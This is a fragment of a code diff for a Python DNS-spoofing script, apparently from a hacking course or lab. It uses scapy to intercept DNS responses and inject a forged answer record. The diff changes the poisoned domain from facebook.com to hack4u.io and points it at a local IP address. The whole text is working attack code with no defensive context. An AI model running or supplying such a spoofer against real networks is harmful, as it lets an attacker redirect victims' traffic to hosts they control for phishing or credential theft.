@@ -13,13 +13,14 @@ signal.signal(signal.SIGINT, def_handler)
 def process_package(packet):
     scapy_packet = scapy.IP(packet.get_payload())
 
+
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
 
-        if b"facebook.com" in qname:
-            print(f"\n[+] Poisioning facebook.com domain")
+        if b"hack4u.io" in qname:
+            print(f"\n[+] Poisioning hack4u.io domain")
 
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.100.202")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.100.208")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
             
